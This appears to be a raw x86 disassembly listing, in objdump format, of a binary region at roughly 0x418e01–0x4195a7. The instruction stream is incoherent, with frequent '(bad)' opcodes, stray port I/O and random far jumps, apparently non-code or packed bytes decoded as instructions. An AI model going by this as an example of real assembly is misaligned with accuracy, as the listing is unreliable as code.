  418e01:	fidiv  WORD PTR [esi+0x72]
  418e04:	add    al,0xa4
  418e06:	mov    esi,0xb98961d8
  418e0b:	jl     0x418df0
  418e0d:	inc    ebx
  418e0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e0f:	(bad)  
  418e10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e11:	adc    dl,bh
  418e13:	mov    ch,BYTE PTR [ecx+0x63]
  418e16:	cs mov ch,0x4c
  418e19:	sub    eax,esi
  418e1b:	nop
  418e1c:	mov    esi,0x589ef220
  418e21:	mov    bl,BYTE PTR [eax]
  418e23:	out    dx,eax
  418e24:	fstp   TBYTE PTR [edx-0x6a]
  418e27:	nop
  418e28:	out    dx,eax
  418e29:	mov    ebx,0x814ab4e7
  418e2e:	adc    DWORD PTR [ebx-0x73],edi
  418e31:	push   ecx
  418e32:	mov    esp,0x92c79620
  418e37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e38:	adc    BYTE PTR [eax-0x71851acd],bh
  418e3e:	sahf   
  418e3f:	in     al,0xc1
  418e41:	cdq    
  418e42:	sbb    al,0x4e
  418e44:	cmp    eax,0xf98a891f
  418e49:	push   eax
  418e4a:	or     ecx,esi
  418e4c:	test   BYTE PTR [eax+edx*1],0x44
  418e50:	cmp    al,0xe2
  418e52:	int3   
  418e53:	add    edi,DWORD PTR [edi-0x62d2f98c]
  418e59:	add    eax,0x154d1b69
  418e5e:	mov    BYTE PTR [eax+0x3c5b9df5],0x15
  418e65:	mov    edx,0x524b7379
  418e6a:	jmp    0x9e47:0x4f268ad7
  418e71:	mov    eax,ds:0x9dedbb38
  418e76:	mov    ah,0x4e
  418e78:	or     al,0xce
  418e7a:	inc    eax
  418e7b:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  418e7d:	pop    eax
  418e7e:	popa   
  418e7f:	std    
  418e80:	and    al,BYTE PTR [ebp+edi*8+0x1347131c]
  418e87:	sbb    BYTE PTR [esi],bl
  418e89:	comiss xmm0,xmm3
  418e8c:	xor    al,0x56
  418e8e:	jo     0x418ed9
  418e90:	pop    ebp
  418e91:	rol    esi,1
  418e93:	cmp    eax,0x97900f46
  418e98:	ins    BYTE PTR es:[edi],dx
  418e99:	out    0x17,al
  418e9b:	out    0x3d,al
  418e9d:	mov    dl,0xf4
  418e9f:	and    al,0x91
  418ea1:	push   es
  418ea2:	sbb    esi,DWORD PTR [edi+0x3d91fa8e]
  418ea8:	lds    esi,FWORD PTR [edi]
  418eaa:	jbe    0x418efb
  418eac:	mov    DWORD PTR [ebp-0x16],ebx
  418eaf:	adc    dh,BYTE PTR [edx+0x30]
  418eb2:	add    al,0x76
  418eb4:	add    ah,BYTE PTR [edi-0x48]
  418eb7:	xor    eax,0x9c6fe39b
  418ebc:	sub    eax,0xb283a9c0
  418ec1:	mov    edi,0xe5116aef
  418ec6:	lods   eax,DWORD PTR ds:[esi]
  418ec7:	push   eax
  418ec8:	test   eax,0xc13a3a2c
  418ecd:	out    0x36,al
  418ecf:	loope  0x418e62
  418ed1:	jae    0x418f2b
  418ed3:	mov    DWORD PTR [ebp-0x24],ebx
  418ed6:	add    DWORD PTR [esi],esi
  418ed8:	stos   DWORD PTR es:[edi],eax
  418ed9:	cwde   
  418eda:	mov    ds:0x59c234ae,al
  418edf:	push   0x67977cbe
  418ee4:	fist   WORD PTR [eax+ecx*8+0x3e44c086]
  418eeb:	arpl   WORD PTR [ebp-0x55],dx
  418eee:	and    eax,0xab4f26f1
  418ef3:	ret    0xd6b2
  418ef6:	div    DWORD PTR [ebx]
  418ef8:	dec    eax
  418ef9:	and    al,0x63
  418efb:	dec    edx
  418efc:	mov    dh,0x9f
  418efe:	pop    ebx
  418eff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f00:	(bad)  
  418f01:	in     eax,0xdd
  418f03:	imul   edx,DWORD PTR ss:[ebp+0x51],0x2dc66558
  418f0b:	jo     0x418eab
  418f0d:	cmp    dh,bh
  418f0f:	std    
  418f10:	jg     0x418efd
  418f12:	adc    al,0xad
  418f14:	mov    ch,0x2f
  418f16:	add    BYTE PTR [ebp+ebp*1+0x61212494],0x32
  418f1e:	daa    
  418f1f:	sbb    eax,0x61a1f72a
  418f24:	fs iret 
  418f26:	mov    dl,0xc8
  418f28:	idiv   BYTE PTR [esi]
  418f2a:	mov    DWORD PTR [esi],0xb1dfbe16
  418f30:	mov    ah,0x3b
  418f32:	ds ins DWORD PTR es:[edi],dx
  418f34:	sub    al,0x4d
  418f36:	stos   DWORD PTR es:[edi],eax
  418f37:	or     al,BYTE PTR [ebp+0x371a4c6f]
  418f3d:	test   DWORD PTR [ecx],edx
  418f3f:	cmp    bh,BYTE PTR [ebx+edx*4]
  418f42:	ret    0x26f1
  418f45:	push   ebx
  418f46:	push   cs
  418f47:	out    dx,al
  418f48:	fidivr WORD PTR [edx]
  418f4a:	adc    BYTE PTR [edi+eax*4+0x6bac406a],bh
  418f51:	xlat   BYTE PTR ds:[ebx]
  418f52:	loope  0x418fc0
  418f54:	inc    ebx
  418f55:	pop    ss
  418f56:	push   esp
  418f57:	ret    0x952a
  418f5a:	in     eax,0x3c
  418f5c:	int3   
  418f5d:	daa    
  418f5e:	push   edi
  418f5f:	lea    esi,[ecx+0x78]
  418f62:	in     eax,dx
  418f63:	je     0x418f5e
  418f65:	aad    0x2
  418f67:	pop    eax
  418f68:	fst    QWORD PTR [esi-0xe]
  418f6b:	daa    
  418f6c:	adc    ebx,DWORD PTR [ebx+0x76]
  418f6f:	mov    cl,0x9c
  418f71:	mov    ecx,0xe5b265af
  418f76:	adc    al,0xee
  418f78:	sub    eax,DWORD PTR [edi+0xe]
  418f7b:	add    bh,BYTE PTR [esi-0x13eb23a]
  418f81:	cmc    
  418f82:	push   edx
  418f83:	ja     0x418fb6
  418f85:	in     eax,dx
  418f86:	in     al,0x8d
  418f88:	xchg   ecx,eax
  418f89:	xchg   edx,eax
  418f8a:	adc    al,BYTE PTR [edi-0x4f86a7e3]
  418f90:	pusha  
  418f91:	test   al,0x3e
  418f93:	rcr    BYTE PTR [edx-0x3d9a6669],0xa7
  418f9a:	mov    DWORD PTR [esi+0x65429870],esi
  418fa0:	cmp    ch,al
  418fa2:	jmp    0x9208:0x68417a42
  418fa9:	ror    BYTE PTR [edx],0xa0
  418fac:	pushf  
  418fad:	push   cs
  418fae:	addr16 inc edi
  418fb0:	popa   
  418fb1:	repnz xor ecx,DWORD PTR [eax+edx*8-0x4e]
  418fb6:	jb     0x418f5a
  418fb8:	push   ecx
  418fb9:	call   ecx
  418fbb:	repz xchg ebp,eax
  418fbd:	sbb    bh,BYTE PTR [eax+0x6c]
  418fc0:	pop    esp
  418fc1:	mov    al,0x13
  418fc3:	mov    esp,0xb4b5c7dd
  418fc8:	pop    DWORD PTR [ebx-0x19]
  418fcb:	into   
  418fcc:	in     eax,dx
  418fcd:	push   cs
  418fce:	add    al,BYTE PTR [eax+0x19]
  418fd1:	and    BYTE PTR [edx+0x2d],0xb4
  418fd5:	es inc ebx
  418fd7:	and    ecx,esp
  418fd9:	push   ds
  418fda:	std    
  418fdb:	lds    edx,FWORD PTR [edi*8+0x2e99a9ba]
  418fe2:	in     eax,0x4c
  418fe4:	dec    ebx
  418fe5:	les    ecx,FWORD PTR [ebp-0x3ff4a5aa]
  418feb:	mov    dh,0xaf
  418fed:	mov    al,ds:0xde7adb14
  418ff2:	or     BYTE PTR [ebx+0x763ca36f],al
  418ff8:	pusha  
  418ff9:	add    DWORD PTR [ebp-0x6bc90cbc],0x67
  419000:	int3   
  419001:	outs   dx,BYTE PTR ds:[esi]
  419002:	cmp    dh,BYTE PTR [edi+ebx*8-0x3537b56f]
  419009:	mov    al,0xd9
  41900b:	outs   dx,BYTE PTR ds:[esi]
  41900c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41900d:	pusha  
  41900e:	lock mov dl,0x71
  419011:	test   eax,0xa7bd0023
  419016:	popf   
  419017:	out    dx,eax
  419018:	retf   0x2a52
  41901b:	inc    esi
  41901c:	in     al,dx
  41901d:	lea    esp,[ebp+0x798e1c2a]
  419023:	hlt    
  419024:	inc    esp
  419025:	add    eax,0xd7c46964
  41902a:	pop    ds
  41902b:	gs ds lock sahf 
  41902f:	in     eax,dx
  419030:	inc    eax
  419031:	popf   
  419032:	push   ss
  419033:	add    eax,DWORD PTR [edi+0x5fa0875b]
  419039:	pop    eax
  41903a:	cmp    dh,BYTE PTR [ebx]
  41903c:	js     0x419076
  41903e:	cld    
  41903f:	push   ebx
  419040:	idiv   DWORD PTR [esi-0x7b38e4f5]
  419046:	ret    
  419047:	ficom  DWORD PTR [edi-0x10d085bf]
  41904d:	(bad)
  419050:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419051:	and    DWORD PTR [ecx+esi*4],ecx
  419054:	in     al,0xab
  419056:	pop    eax
  419057:	adc    eax,0xdcf55dae
  41905c:	sub    eax,0xe7896e6b
  419061:	cwde   
  419062:	or     dh,BYTE PTR [edx]
  419064:	jmp    0x418fe9
  419066:	aas    
  419067:	cli    
  419068:	sbb    al,0x5c
  41906a:	fild   QWORD PTR [ebp-0x377be1e1]
  419070:	inc    esi
  419071:	js     0x4190b0
  419073:	sbb    ch,0x8d
  419076:	sbb    al,BYTE PTR [edx+0x57]
  419079:	rcl    bh,1
  41907b:	mov    ecx,DWORD PTR [ebx+esi*2]
  41907e:	xor    al,0x13
  419080:	xor    ebp,edi
  419082:	int    0xd
  419084:	cmp    dl,BYTE PTR [esp+ebp*1+0x7]
  419088:	xlat   BYTE PTR ds:[ebx]
  419089:	addr16 jl 0x4190f1
  41908c:	or     DWORD PTR [esi+0x78],0x27
  419090:	int    0xa8
  419092:	dec    ebp
  419093:	(bad)  
  419094:	cmc    
  419095:	gs loope 0x4190b4
  419098:	cmp    DWORD PTR [eax],ebx
  41909a:	jl     0x41906a
  41909c:	sub    BYTE PTR [ebx],al
  41909e:	fsubr  DWORD PTR [ebp+0x5878c51]
  4190a4:	hlt    
  4190a5:	adc    al,0xb1
  4190a7:	cs jb  0x419076
  4190aa:	daa    
  4190ab:	xor    esp,edx
  4190ad:	pop    ecx
  4190ae:	or     dl,BYTE PTR [edi+ecx*4]
  4190b1:	or     BYTE PTR [eax],ch
  4190b3:	xchg   DWORD PTR [eax+eiz*1-0x82986a4],esp
  4190ba:	inc    ebx
  4190bb:	popf   
  4190bc:	fdiv   DWORD PTR [esi+0x7fd1381e]
  4190c2:	push   ebx
  4190c3:	mov    ebp,0x4c7154bb
  4190c8:	lods   eax,DWORD PTR ds:[esi]
  4190c9:	stc    
  4190ca:	or     BYTE PTR ds:0xd4fc4281,0xc2
  4190d1:	or     BYTE PTR [ebx],ah
  4190d3:	push   esp
  4190d4:	dec    esp
  4190d5:	jecxz  0x4190d3
  4190d7:	jg     0x419137
  4190d9:	int3   
  4190da:	xchg   ebp,eax
  4190db:	mov    ecx,0x1bb4a7df
  4190e0:	adc    edi,esi
  4190e2:	and    DWORD PTR [ebx-0x6407c6a8],esi
  4190e8:	popa   
  4190e9:	(bad)  
  4190ea:	xor    ah,BYTE PTR [ecx+0x459913da]
  4190f0:	mov    al,ds:0xdf47e5f9
  4190f5:	retf   
  4190f6:	rcl    al,1
  4190f8:	mov    ch,0xe5
  4190fa:	jnp    0x419098
  4190fc:	jmp    0x41913a
  4190fe:	sub    ch,BYTE PTR [ecx]
  419100:	lock out 0x14,al
  419103:	cmp    al,0xa9
  419105:	jae    0x419119
  419107:	mov    ecx,DWORD PTR [esi]
  419109:	ins    BYTE PTR es:[edi],dx
  41910a:	inc    edx
  41910b:	scas   eax,DWORD PTR es:[edi]
  41910c:	sub    DWORD PTR [ecx+ebp*8-0x35b83120],ebp
  419113:	lds    edi,FWORD PTR [esi+0x26]
  419116:	cs ret 0xbb08
  41911a:	cli    
  41911b:	jge    0x419153
  41911d:	mov    bh,0xbd
  41911f:	jge    0x4190f6
  419121:	push   0x66
  419123:	loopne 0x4190ab
  419125:	xor    al,ah
  419127:	pop    eax
  419128:	pop    eax
  419129:	add    bl,bl
  41912b:	lock cmp BYTE PTR [ecx],dl
  41912e:	nop
  41912f:	fcmovnbe st,st(6)
  419131:	in     eax,0x54
  419133:	mov    edx,0x9304d911
  419138:	loop   0x419163
  41913a:	add    eax,0x27752606
  41913f:	lahf   
  419140:	retf   
  419141:	fimul  DWORD PTR [esi-0x3c34cd6d]
  419147:	out    0x3a,al
  419149:	sub    ch,BYTE PTR [ecx]
  41914b:	xlat   BYTE PTR ds:[ebx]
  41914c:	imul   ebp,edi,0xffffffae
  41914f:	enter  0x9dc2,0x9e
  419153:	xchg   esi,eax
  419154:	sub    eax,0x7560123f
  419159:	mov    dh,0xe7
  41915b:	add    eax,0x54b54ebd
  419160:	push   eax
  419161:	mov    dh,0xa5
  419163:	stos   BYTE PTR es:[edi],al
  419164:	retf   0x598e
  419167:	xchg   ebx,eax
  419168:	add    bl,BYTE PTR [edx+0xa]
  41916b:	hlt    
  41916c:	in     eax,dx
  41916d:	mov    bh,0x19
  41916f:	lock rol BYTE PTR [edx+0x1be431e1],0x27
  419177:	push   ebx
  419178:	push   esi
  419179:	popf   
  41917a:	sar    DWORD PTR [edx],0xc
  41917d:	mov    dh,0xe
  41917f:	xchg   esi,eax
  419180:	enter  0x6c28,0xac
  419184:	aas    
  419185:	mov    ds:0xe844f989,al
  41918a:	add    BYTE PTR [ecx+ecx*8+0x77],cl
  41918e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41918f:	push   esp
  419190:	shl    BYTE PTR [edx-0x1e],0xe
  419194:	or     al,0xc0
  419196:	imul   ecx,DWORD PTR [eax],0xfb423b3f
  41919c:	shr    BYTE PTR [esi+0x6c],cl
  41919f:	mov    al,BYTE PTR [ebx-0x63]
  4191a2:	dec    edx
  4191a3:	aaa    
  4191a4:	call   0x3d4e:0xf98ddc20
  4191ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191ac:	cdq    
  4191ad:	scas   eax,DWORD PTR es:[edi]
  4191ae:	ss xchg esp,eax
  4191b0:	and    al,0xb9
  4191b2:	inc    esp
  4191b3:	xchg   esi,eax
  4191b4:	das    
  4191b5:	retf   
  4191b6:	in     eax,0xe3
  4191b8:	(bad)  
  4191b9:	scas   eax,DWORD PTR es:[edi]
  4191ba:	mov    eax,gs
  4191bc:	imul   DWORD PTR [ebp+0x7e11ddc4]
  4191c2:	add    esp,ebx
  4191c4:	(bad)  
  4191c5:	ja     0x419244
  4191c7:	ja     0x419227
  4191c9:	cs ret 
  4191cb:	push   eax
  4191cc:	xor    DWORD PTR [esi+0x1e9ed9ec],esp
  4191d2:	lods   eax,DWORD PTR ds:[esi]
  4191d3:	into   
  4191d4:	aas    
  4191d5:	sbb    al,0x87
  4191d7:	ror    DWORD PTR [ecx],1
  4191d9:	repnz pop ss
  4191db:	not    BYTE PTR [edi]
  4191dd:	and    edi,DWORD PTR [ebx-0x605eca0f]
  4191e3:	pop    edi
  4191e4:	mov    ebx,0xda3cf436
  4191e9:	cs jl  0x419245
  4191ec:	sub    DWORD PTR [edi],esp
  4191ee:	pushf  
  4191ef:	cmp    BYTE PTR [ebx+0x5c],al
  4191f2:	inc    ebx
  4191f3:	cmc    
  4191f4:	and    bh,dl
  4191f6:	dec    esp
  4191f7:	adc    ebx,ecx
  4191f9:	jo     0x4191fa
  4191fb:	les    ebp,FWORD PTR [edi]
  4191fd:	in     eax,dx
  4191fe:	rol    edx,0x1f
  419201:	jb     0x419217
  419203:	sbb    al,0xbe
  419205:	inc    ebx
  419206:	dec    ebp
  419207:	inc    esp
  419208:	mov    ebp,0xfe79a85e
  41920d:	es or  ecx,ebp
  419210:	jnp    0x419280
  419212:	cmp    eax,0x9dde6542
  419217:	(bad)  
  419218:	in     al,dx
  419219:	jg     0xbc2e44ad
  41921f:	xor    esi,DWORD PTR [eax-0x1]
  419222:	inc    ecx
  419223:	cwde   
  419224:	pop    ss
  419225:	lea    edx,[esi+edx*2-0x5ad9d28e]
  41922c:	hlt    
  41922d:	out    0xe2,eax
  41922f:	(bad)  
  419230:	cmp    DWORD PTR [esp+ebx*8],esp
  419233:	out    dx,al
  419234:	push   cs
  419235:	jne    0x41928f
  419237:	addr16 push cs
  419239:	imul   esp,edx,0x5526fcd8
  41923f:	int3   
  419240:	jae    0x4192b4
  419242:	jmp    0xef678956
  419247:	ficom  DWORD PTR [ecx]
  419249:	or     bl,dh
  41924b:	hlt    
  41924c:	inc    ebx
  41924d:	fbstp  TBYTE PTR [esi+0x41]
  419250:	test   DWORD PTR [esi-0x31],edx
  419253:	or     ch,dh
  419255:	int3   
  419256:	hlt    
  419257:	loop   0x4191dd
  419259:	leave  
  41925a:	rcr    DWORD PTR ds:0xab950e5a,cl
  419260:	sub    DWORD PTR [ebx-0xb4e61eb],ebp
  419266:	mov    ds:0xbd82b1ad,al
  41926b:	push   eax
  41926c:	add    edx,DWORD PTR [edx+0x5c7d4a2b]
  419272:	das    
  419273:	(bad)
  419277:	loope  0x41927d
  419279:	imul   edi,DWORD PTR [ecx+0x3e6cb00],0x5b
  419280:	push   0x18
  419282:	retf   0x8b46
  419285:	(bad)  
  419286:	cmp    al,0x69
  419288:	cdq    
  419289:	scas   al,BYTE PTR es:[edi]
  41928a:	arpl   WORD PTR [ecx],bp
  41928c:	xchg   ch,bh
  41928e:	push   0xffffff86
  419290:	out    dx,eax
  419291:	and    DWORD PTR [ebp-0x59e6284c],0x5dd49b3e
  41929b:	ret    
  41929c:	shl    DWORD PTR [eax+0x9],cl
  41929f:	jp     0x4192e6
  4192a1:	pushf  
  4192a2:	popa   
  4192a3:	push   esi
  4192a4:	pop    ebp
  4192a5:	cmp    cl,bh
  4192a7:	pop    ebx
  4192a8:	and    ah,dh
  4192aa:	and    esi,ebp
  4192ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192ad:	push   es
  4192ae:	sub    ebp,eax
  4192b0:	inc    ecx
  4192b1:	pop    ebx
  4192b2:	nop
  4192b3:	(bad)  
  4192b4:	sbb    al,BYTE PTR [esi+0x4c]
  4192b7:	sbb    BYTE PTR [ebx-0x409a9053],cl
  4192bd:	test   BYTE PTR [eax+0x75b0b49a],al
  4192c3:	stos   BYTE PTR es:[edi],al
  4192c4:	xor    esp,DWORD PTR [edi+0x61]
  4192c7:	sti    
  4192c8:	pusha  
  4192c9:	jle    0x419302
  4192cb:	movups xmm5,xmm3
  4192ce:	mov    ebx,0xc2bf2738
  4192d3:	push   eax
  4192d4:	add    BYTE PTR [esi-0x5c],dh
  4192d7:	mov    ecx,DWORD PTR [edi-0x5]
  4192da:	pop    eax
  4192db:	sbb    eax,0xf135255c
  4192e0:	inc    edx
  4192e1:	arpl   WORD PTR [eax+0x61],si
  4192e4:	mov    eax,ds:0x7b0af6b8
  4192e9:	or     DWORD PTR [edx-0x76],eax
  4192ec:	dec    esp
  4192ed:	jecxz  0x4192f8
  4192ef:	cs lahf 
  4192f1:	iret   
  4192f2:	push   ecx
  4192f3:	push   ss
  4192f4:	and    al,0x26
  4192f6:	dec    ecx
  4192f7:	into   
  4192f8:	push   cs
  4192f9:	xchg   esi,eax
  4192fa:	inc    ecx
  4192fb:	fcom   DWORD PTR [eax]
  4192fd:	push   0xffffffc8
  4192ff:	retf   0xcc68
  419302:	ret    
  419303:	pushf  
  419304:	sbb    eax,0x7206e37f
  419309:	inc    ebx
  41930a:	mov    ds:0x9e6b8932,al
  41930f:	les    esi,FWORD PTR [eax-0x30]
  419312:	out    0x89,al
  419314:	loop   0x419340
  419316:	es inc sp
  419319:	test   ecx,0x7da37277
  41931f:	mov    esp,0xc3c09830
  419324:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419325:	scas   al,BYTE PTR es:[edi]
  419326:	sbb    al,0xdb
  419328:	stos   BYTE PTR es:[edi],al
  419329:	push   es
  41932a:	clc    
  41932b:	iret   
  41932c:	loopne 0x4193a7
  41932e:	scas   al,BYTE PTR es:[edi]
  41932f:	icebp  
  419330:	mov    gs,WORD PTR [ebx-0x39]
  419333:	in     eax,0x31
  419335:	lock out 0xcc,al
  419338:	lods   al,BYTE PTR ds:[esi]
  419339:	push   esi
  41933a:	push   ss
  41933b:	and    BYTE PTR [ebx-0x2749ee1a],0x8c
  419342:	dec    edx
  419343:	ins    BYTE PTR es:[edi],dx
  419344:	dec    esi
  419345:	xor    BYTE PTR [eax],0xe8
  419348:	pop    esp
  419349:	lahf   
  41934a:	sbb    esp,esp
  41934c:	push   0x22
  41934e:	dec    esp
  41934f:	out    0xe2,al
  419351:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419352:	cmc    
  419353:	xchg   DWORD PTR [edi-0x31],eax
  419356:	cmc    
  419357:	cmp    BYTE PTR [esi+ecx*1+0x3e],ah
  41935b:	test   ch,dh
  41935d:	mov    ch,0x67
  41935f:	(bad)  
  419360:	subps  xmm6,XMMWORD PTR [ebp-0x6e]
  419364:	fsubr  QWORD PTR [ecx]
  419366:	ins    BYTE PTR es:[edi],dx
  419367:	xor    al,0xb7
  419369:	hlt    
  41936a:	add    ecx,esp
  41936c:	lds    esp,FWORD PTR [edx]
  41936e:	mov    esp,0x17a06933
  419373:	fsub   QWORD PTR [ecx-0x180359ef]
  419379:	(bad)  [esi]
  41937b:	adc    dl,ch
  41937d:	sti    
  41937e:	(bad)  
  419380:	retf   0x383a
  419383:	xchg   edx,eax
  419384:	mov    db6,ecx
  419387:	repz add DWORD PTR [edi-0x4],edi
  41938b:	or     bl,al
  41938d:	loopne 0x41934c
  41938f:	lea    ebx,ds:0x1b09c56f
  419395:	push   edx
  419396:	ds add eax,0xf5dec849
  41939c:	adc    DWORD PTR [esi-0x54af6725],esp
  4193a2:	nop
  4193a3:	jg     0x419383
  4193a5:	mov    ?,WORD PTR [ecx-0x1496a2c0]
  4193ab:	ss jg  0x419334
  4193ae:	lods   al,BYTE PTR ds:[esi]
  4193af:	jmp    0x4193c4
  4193b1:	lds    eax,FWORD PTR [eax]
  4193b3:	push   cs
  4193b4:	or     al,0xb1
  4193b6:	mov    bh,0xb
  4193b8:	ds icebp 
  4193ba:	mov    ch,0x15
  4193bc:	idiv   BYTE PTR [edx+0x1ccd902b]
  4193c2:	daa    
  4193c3:	mov    WORD PTR [edx],ss
  4193c5:	inc    ecx
  4193c6:	hlt    
  4193c7:	int    0x69
  4193c9:	push   edx
  4193ca:	push   0x20
  4193cc:	pop    edi
  4193cd:	xchg   edi,eax
  4193ce:	pop    ebp
  4193cf:	mov    edx,0x88aa66f8
  4193d4:	mov    edx,0xadf8b337
  4193d9:	push   es
  4193da:	and    DWORD PTR [ecx-0x50],0x2f
  4193de:	out    0x4b,al
  4193e0:	fadd   st,st(4)
  4193e2:	push   edx
  4193e3:	pop    es
  4193e4:	mov    cl,0x6c
  4193e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193e7:	mov    al,BYTE PTR [ebp+0x502c0973]
  4193ed:	pushf  
  4193ee:	inc    edx
  4193ef:	jp     0x4193d6
  4193f1:	push   edx
  4193f2:	iret   
  4193f3:	pop    esi
  4193f4:	mov    edi,DWORD PTR [edx]
  4193f6:	xchg   ebx,eax
  4193f7:	(bad)  
  4193f8:	gs retf 
  4193fa:	addr16 (bad) 
  4193fc:	cmc    
  4193fd:	hlt    
  4193fe:	out    0x12,eax
  419400:	in     eax,0xc5
  419402:	rcl    ebx,0x96
  419405:	iret   
  419406:	rcr    BYTE PTR [edx+0x38],0xbf
  41940a:	adc    eax,0x1c74977e
  41940f:	stc    
  419410:	add    eax,0xecd705de
  419415:	add    BYTE PTR [eax+0x63],0x9d
  419419:	fimul  WORD PTR [ebx+0xb]
  41941c:	data16 xlat BYTE PTR ds:[ebx]
  41941e:	cmp    DWORD PTR [edi+0x7b],edx
  419421:	or     eax,0xaed6b398
  419426:	or     al,0x53
  419428:	or     BYTE PTR cs:[edx-0x19],ah
  41942c:	aad    0x6d
  41942e:	mov    ds:0x374c70ac,al
  419433:	std    
  419434:	dec    edx
  419435:	push   eax
  419436:	fdivp  st(7),st
  419438:	retf   
  419439:	sub    DWORD PTR [edi-0x3],0xe3f7f530
  419440:	sub    dl,BYTE PTR [esi]
  419442:	inc    edx
  419443:	rcr    BYTE PTR [edx],1
  419445:	lock sub cl,BYTE PTR [ecx+0x11]
  419449:	xchg   ebp,eax
  41944a:	enter  0xef12,0x58
  41944e:	push   esp
  41944f:	mov    BYTE PTR [ebx-0x1c],cl
  419452:	mov    cl,0xb6
  419454:	test   BYTE PTR [esi+0x65],ah
  419457:	in     al,0x11
  419459:	and    dh,0xe5
  41945c:	push   ebp
  41945d:	addr16 inc esi
  41945f:	and    DWORD PTR [eax],ebx
  419461:	dec    eax
  419462:	dec    edx
  419463:	cmp    al,0xee
  419465:	push   ecx
  419466:	outs   dx,DWORD PTR ds:[esi]
  419467:	retf   
  419468:	in     al,dx
  419469:	mov    bh,0x12
  41946b:	mov    dh,0xcb
  41946d:	xor    DWORD PTR fs:[ebx],esp
  419470:	lods   eax,DWORD PTR ds:[esi]
  419471:	lahf   
  419472:	jne    0x41940e
  419474:	add    bh,dh
  419476:	mov    esi,0x4adb819a
  41947b:	mov    dh,0xc3
  41947d:	cli    
  41947e:	arpl   WORD PTR [ebx-0x8],dx
  419481:	nop
  419482:	sbb    dl,cl
  419484:	aam    0x43
  419486:	xchg   edx,eax
  419487:	repz enter 0xaa61,0x4d
  41948c:	sub    DWORD PTR [ebp-0xc],edx
  41948f:	xchg   ecx,eax
  419490:	imul   edx,DWORD PTR [edx],0xffffffb9
  419493:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419495:	adc    al,0xc7
  419497:	push   es
  419498:	push   ds
  419499:	mov    ecx,gs
  41949b:	xor    DWORD PTR [ebp+0x59],ecx
  41949e:	ins    DWORD PTR es:[edi],dx
  41949f:	xor    cl,BYTE PTR [ecx+ecx*8]
  4194a2:	int3   
  4194a3:	imul   edx,DWORD PTR [edi+0x42907584],0xc
  4194aa:	mov    ebx,0x7cc12f07
  4194af:	sub    DWORD PTR [esi+0x7ff3c779],eax
  4194b5:	xor    ebx,DWORD PTR [esi-0x40afaa9d]
  4194bb:	mov    edi,0xb0b83481
  4194c0:	mov    eax,ds:0x102881fd
  4194c5:	xchg   edi,eax
  4194c6:	adc    DWORD PTR [edx-0x1],esp
  4194c9:	mov    dl,0x91
  4194cb:	(bad)
  4194ce:	enter  0xb799,0x31
  4194d2:	and    DWORD PTR [ebx+0x20],edx
  4194d5:	outs   dx,BYTE PTR ds:[esi]
  4194d6:	sbb    ch,BYTE PTR [ebp+0x4]
  4194d9:	pop    esi
  4194da:	dec    ecx
  4194db:	adc    al,0xf8
  4194dd:	xchg   esi,eax
  4194de:	inc    edx
  4194df:	add    al,0xfa
  4194e1:	cmovns edi,DWORD PTR ds:0xe25fd253
  4194e8:	or     DWORD PTR [ebx+eax*8-0x37],esp
  4194ec:	push   ecx
  4194ed:	(bad)  
  4194ee:	or     al,0x52
  4194f0:	push   ebx
  4194f1:	int    0x87
  4194f3:	hlt    
  4194f4:	cmp    eax,0x5219aa5a
  4194f9:	cmp    eax,0xf3133cb9
  4194fe:	icebp  
  4194ff:	jmp    0x59dbbd02
  419504:	push   edi
  419505:	cs push 0x89adacd1
  41950b:	mov    eax,0x4fe2a6ba
  419510:	xchg   DWORD PTR [eax+0x5e700ab5],ecx
  419516:	jnp    0x4194a5
  419518:	mov    ebx,0xacef2a7e
  41951d:	jp     0x4194db
  41951f:	push   ds
  419520:	sub    BYTE PTR [eax],ch
  419522:	repz xchg ecx,esi
  419525:	jne    0x4194d9
  419527:	scas   eax,DWORD PTR es:[edi]
  419528:	sub    esi,edx
  41952a:	mov    ?,WORD PTR [edi+0x70f4f6f0]
  419530:	push   edx
  419531:	mov    DWORD PTR [esp+eiz*2],eax
  419534:	dec    ebx
  419535:	xchg   esp,eax
  419536:	std    
  419537:	dec    edi
  419538:	sar    BYTE PTR [esi],1
  41953a:	xchg   esi,eax
  41953b:	push   edi
  41953c:	out    0x91,al
  41953e:	mov    al,ds:0x5f33b4f5
  419543:	dec    edi
  419544:	xor    DWORD PTR [edx+0x42],esp
  419547:	jge    0x419585
  419549:	jb     0x41957f
  41954b:	shl    DWORD PTR [ecx-0x46eb0abf],0x2c
  419552:	test   al,0x75
  419554:	addr16 js 0x4195b8
  419557:	pop    ebp
  419558:	fcomp  QWORD PTR [ecx-0x46528dad]
  41955e:	push   0xdf178055
  419563:	mov    ch,0xc7
  419565:	jbe    0x4194fa
  419567:	cmp    ch,BYTE PTR [ebp+0x566490a3]
  41956d:	inc    BYTE PTR [eax]
  41956f:	js     0x4194ff
  419571:	in     al,dx
  419572:	adc    DWORD PTR [ecx+0x68dbe24],ebp
  419578:	cdq    
  419579:	push   ebx
  41957a:	mov    ds:0x3438276c,al
  41957f:	icebp  
  419580:	mov    BYTE PTR [ecx+edi*2-0x1ec290de],bl
  419587:	pop    ss
  419588:	lock sti 
  41958a:	add    BYTE PTR [edx-0x29],ch
  41958d:	and    eax,0x8652e8a8
  419592:	loop   0x419550
  419594:	xchg   edx,eax
  419595:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419596:	mov    WORD PTR [ecx-0xf],?
  419599:	test   eax,0xcc7c358b
  41959e:	ins    DWORD PTR es:[edi],dx
  41959f:	push   ecx
  4195a0:	fadd   DWORD PTR [ebp-0x7f8ab6ac]
  4195a6:	stos   DWORD PTR es:[edi],eax
  4195a7:	mov    DWORD PTR [ebp+0x2c54b527],eax
